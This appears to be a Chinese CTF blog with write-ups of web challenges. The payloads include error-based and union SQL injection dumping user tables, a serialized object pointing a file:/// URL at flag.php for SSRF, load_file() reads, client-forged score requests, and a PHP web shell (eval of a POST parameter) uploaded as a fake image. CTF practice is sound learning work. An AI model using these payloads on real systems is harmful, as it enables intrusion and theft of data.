<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">先访问<br>/<span class="hljs-keyword">view</span>.php<br>得到<br><br><span class="hljs-keyword">Notice</span>: Undefined <span class="hljs-keyword">index</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">view</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">24</span><br>[*] query error! (You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MariaDB <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span> at <span class="hljs-type">line</span> <span class="hljs-number">1</span>)<br><br><br>Fatal error: <span class="hljs-keyword">Call</span> <span class="hljs-keyword">to</span> a member <span class="hljs-keyword">function</span> fetch_assoc() <span class="hljs-keyword">on</span> <span class="hljs-type">boolean</span> <span class="hljs-keyword">in</span> /var/www/html/db.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">66</span><br><br>可以知道站点目录<br></code></pre></td></tr></table></figure>
<p>看网上的wp(<a target="_blank" rel="noopener" href="https://blog.csdn.net/MyZy_/article/details/143814939)%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%EF%BC%9A">https://blog.csdn.net/MyZy_/article/details/143814939)方法就是：</a><br>先上传一个符合规则的信息，然后使用sql注入把信息中博客url改为本地访问flag.php<br>或者因为没过滤sql的file_load()，可以直接读取flag.php  </p>
<p>那就先用自己的github地址注册一条信息<br>然后在&#x2F;view.php?on&#x3D;1中进行注入<br>然后发现现在的buuctf好像为了防止靶机变成肉鸡，不给出网了<br>那没办法，去nssctf上做吧  </p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span>&lt;&gt;<span class="hljs-keyword">select</span>&lt;&gt;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br><span class="hljs-comment">//不行</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,database()),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!fakebook&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-built_in">tables</span>))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!users,ALL_PLUGINS,APPLICABLE_RO&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!no,username,passwd,data,PLUGIN_&#x27;)</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(%<span class="hljs-number">27</span>!%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>(group_concat(no,username,passwd,data))<span class="hljs-keyword">from</span>(users))),<span class="hljs-number">1</span>)--<br><span class="hljs-comment">//[*] query error! (XPATH syntax error: &#x27;!1zhong3c9909afec25354d551dae215&#x27;)</span><br><span class="hljs-comment">//经典的报错注入回显不完全，这里的passwd应该是就是被加密过的，不然原密码是&#x27;123&#x27;</span><br><span class="hljs-comment">//注意看了一下网上的wp，好像过滤了&#x27;union select&#x27;,使用&#x27;union/**/select&#x27;可以绕过  </span><br><br><span class="hljs-number">1</span> order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道了行列为4</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> --<br><span class="hljs-comment">//知道回显位置是2</span><br><br><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span>/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(no,<span class="hljs-string">&quot;\n&quot;</span>,username,<span class="hljs-string">&quot;\n&quot;</span>,passwd,<span class="hljs-string">&quot;\n&quot;</span>,data),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users --<br><span class="hljs-comment">//1 zhong </span><br><span class="hljs-number">3</span>c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2 <br>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;http://gwwafz.online/&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>这是时候如wp说的，在data里构造一条读取本地flag的链接即可  </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-<span class="hljs-number">1</span> union/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27; from users <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
<p>网页会在blog的区域回显blog链接爬取到的页面，改为file:&#x2F;&#x2F;可以直接访问本地的flag.php源码，所以在f12中查看blog窗口元素即可看，可能是它这个题目的原因，正常的blog也无法显示<br>只能在源码查看了  </p>
<p>解法二：<br>时用sql的load_file()函数，直接读取flag.php<br>注入时传入：  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>


<h2 id="notice-5"><a href="#notice-5" class="headerlink" title="notice"></a>notice</h2><p>file:&#x2F;&#x2F;&#x2F;<br>中是有3个&#x2F;  </p>
<p>还有，为什么传入sql语句<br>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –<br>就能访问到flag.php<br>首先select语句若是没有搜索到东西会自己变成自己添加的数据<br>所以-1没搜索到，会等于自己新建一条数据发给后端语句<br>原语句：  </p>
<p>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –</p>
<p>传入db后db会处理好然后将结果返回语句，其中union select就相当于新建了一条sql查询结果返回  </p>
<p>所以后端源码接收到的sql select 数据就为：  </p>
<p>1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p>
<p>然后将其中data反序列化(看源码)后执行<br>其中1，2，3为另外3条column，改data那条column即可  </p>
<p>然后刚才扫目录时发现了有个<br>db.php<br>可以猜测存在数据库，所以对no进行注入尝试   </p>
<p><strong>ssrf漏洞：</strong><br>我觉得是<br>利用网站对外访问来进行攻击<br>比如这题有curl类的函数  </p>
<p>看nssctf的标签有ssrf<br>第一次做ssrf的题目  </p>
<hr>
<h2 id="title-note-34date-2025-05-11-01-37-11tags-web"><a href="#title-note-34date-2025-05-11-01-37-11tags-web" class="headerlink" title="title: note-34date: 2025-05-11 01:37:11tags: web"></a>title: note-34<br>date: 2025-05-11 01:37:11<br>tags: web</h2><h1 id="Mini-L-CTF-GuessOneGuess"><a href="#Mini-L-CTF-GuessOneGuess" class="headerlink" title="Mini L-CTF GuessOneGuess"></a>Mini L-CTF GuessOneGuess</h1><p>下载源码  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">io</span>) </span>&#123;<br>    io.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, (socket) =&gt; &#123;<br>        let targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        let guessCount = <span class="hljs-number">0</span>;<br>        let totalScore = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.env.FLAG || <span class="hljs-string">&quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;</span>;<br>        console.<span class="hljs-title function_ invoke__">log</span>(`新连接 - 目标数字: $&#123;targetNumber&#125;`);<br><br>    <br>        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;猜一个1-100之间的数字！&#x27;</span>,<br>            <span class="hljs-attr">score</span>: totalScore<br>        &#125;);<br><br>        <br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, (data) =&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>              console.<span class="hljs-title function_ invoke__">log</span>(totalScore);<br>                <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">guess</span> = <span class="hljs-title function_ invoke__">parseInt</span>(data.value);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isNaN</span>(guess)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入有效数字&#x27;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (guess &lt; <span class="hljs-number">1</span> || guess &gt; <span class="hljs-number">100</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;请输入1-100之间的数字&#x27;</span>);<br>                &#125;<br><br>                guessCount++;<br><br>                <span class="hljs-keyword">if</span> (guess === targetNumber) &#123;<br>                   <br>                    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">currentScore</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-number">100</span> / Math.<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>, guessCount - <span class="hljs-number">1</span>));<br>                    totalScore += currentScore;<br><br>                    let message = `🎉 猜对了！得分 +$&#123;currentScore&#125; (总分数: $&#123;totalScore&#125;)`;<br>                    let showFlag = <span class="hljs-literal">false</span>;<br><br>                    <span class="hljs-keyword">if</span> (totalScore &gt; <span class="hljs-number">1.7976931348623157e308</span>) &#123;<br>                        message += `\n🏴 $&#123;FLAG&#125;`;<br>                        showFlag = <span class="hljs-literal">true</span>;<br>                    &#125;<br><br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>                        <span class="hljs-attr">message</span>: message,<br>                        <span class="hljs-attr">score</span>: totalScore,<br>                        <span class="hljs-attr">showFlag</span>: showFlag,<br>                        <span class="hljs-attr">currentScore</span>: currentScore<br>                    &#125;);<br><br>                    <br>                    targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>                    console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>                    guessCount = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (guessCount &gt;= <span class="hljs-number">100</span>) &#123;<br>                      console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>);<br>                        socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;punishment&#x27;</span>, &#123;<br>                            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;100次未猜中！将扣除当前分数并重置&quot;</span>,<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">message</span>: guess &lt; targetNumber ? <span class="hljs-string">&#x27;太小了！&#x27;</span> : <span class="hljs-string">&#x27;太大了！&#x27;</span>,<br>                        <span class="hljs-attr">score</span>: totalScore<br>                    &#125;);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>                socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>                    <span class="hljs-attr">message</span>: err.message,<br>                    <span class="hljs-attr">score</span>: totalScore<br>                &#125;);<br>            &#125;<br>        &#125;);<br>        socket.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, (data) =&gt; &#123;<br>          totalScore -= data.score;<br>          guessCount = <span class="hljs-number">0</span>;<br>          targetNumber = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>          console.<span class="hljs-title function_ invoke__">log</span>(`新目标数字: $&#123;targetNumber&#125;`);<br>          socket.<span class="hljs-title function_ invoke__">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>            <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;扣除分数并重置&quot;</span>,<br>            <span class="hljs-attr">score</span>: totalScore,<br>            <span class="hljs-attr">showFlag</span>: <span class="hljs-literal">false</span>,<br>          &#125;);<br><br>        &#125;);<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure>
<p>注意到最后有一项猜错一百次后删除分数的函数<br>这个分数是data,为上传的data  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">totalScore -<span class="hljs-operator">=</span> data.score<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>我们上传一个负数，根据源码里的减去，就能实现负负得正，获得足够分数<br>之后的totalScore是足够分数来输出flag的<br>此时再猜对一次触发输出flag即可  </p>
<p>操作过程：<br>输入1 然后bp抓包重发99次，<br>在99次时把上传的分数改为：  </p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-symbol">&#x27;42</span>[<span class="hljs-string">&quot;punishment-response&quot;</span>,&#123;<span class="hljs-string">&quot;score&quot;</span>:-1e309&#125;]&#x27;<br></code></pre></td></tr></table></figure>
<p>此时服务器里的数组已经达到发送flag的数值了，但是要触发分数检测然后输出flag需要猜对一次，<br>所以再猜对一次即可  </p>
<p>实测直接使用punishment事件就可以直接上传分数了<br>不用错一百次  </p>
<h1 id="Mini-L-CTF-麦霸评分"><a href="#Mini-L-CTF-麦霸评分" class="headerlink" title="Mini L_CTF 麦霸评分"></a>Mini L_CTF 麦霸评分</h1><p>题目给了源码<br>看到源码里有获取原音频的地址：<br>&#x2F;original.wav  </p>
<p>提交录音的地址：<br>&#x2F;compare-recording  </p>
<p>那直接把原音提交即可  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 1. 直接请求原版音频（替换为实际音频路径）</span><br>audio_url = <span class="hljs-string">&quot;http://127.0.0.1:37563/original.wav&quot;</span>  <span class="hljs-comment"># </span><br>audio = requests.get(audio_url).content<br><br><span class="hljs-comment"># 2. 伪装成用户录音提交</span><br>r = requests.post(<br>    <span class="hljs-string">&quot;http://127.0.0.1:37563/compare-recording&quot;</span>, <span class="hljs-comment"># </span><br>    files=&#123;<span class="hljs-string">&quot;audio&quot;</span>: (<span class="hljs-string">&quot;recording.wav&quot;</span>, audio)&#125;<br>)<br>a=requests.get(audio_url).headers<br><br><span class="hljs-comment"># 3. 提取flag</span><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>给deepseek一眼顶针了，在浏览器控制台运行就行：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getFlag</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 替换成上一步获取的真实URL（示例：/original.wav?sign=abc123）</span><br>  <span class="hljs-keyword">const</span> serverPath = <span class="hljs-string">&#x27;/original.wav?sign=abc123&#x27;</span>; <br><br>  <span class="hljs-comment">// 直接使用服务器路径获取音频</span><br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(serverPath);<br>  <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();<br><br>  <span class="hljs-comment">// 提交到评分接口</span><br>  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;audio&#x27;</span>, blob, <span class="hljs-string">&#x27;recording.wav&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/compare-recording&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">body</span>: formData &#125;);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">flag</span>) <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;FLAG: &#x27;</span> + data.<span class="hljs-property">flag</span>);<br>&#125;<br><br><span class="hljs-comment">// 添加冷却时间绕过</span><br><span class="hljs-built_in">setTimeout</span>(getFlag, <span class="hljs-number">11000</span>); <span class="hljs-comment">// 等待11秒后执行</span><br></code></pre></td></tr></table></figure>
<h1 id="Mini-L-CTF-吃豆人"><a href="#Mini-L-CTF-吃豆人" class="headerlink" title="Mini L-CTF 吃豆人"></a>Mini L-CTF 吃豆人</h1><p>查看源码，得到上传的地址，<br>直接传  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/submit_score</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">29530</span><span class="hljs-symbol">/</span><br>Content-type:application<span class="hljs-symbol">/json</span><br><br>&#123;<br><span class="hljs-string">&quot;score&quot;</span>:<span class="hljs-number">50000</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>拿到flag</p>
<p>前端可以自己改，还有注释，有很多方法解<br>比如前端找到吃豆逻辑吧吃一个蓝豆改为100000000直接拿到  </p>
<h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure>
<p>提示：<br>exif_imagetype:not image!</p>
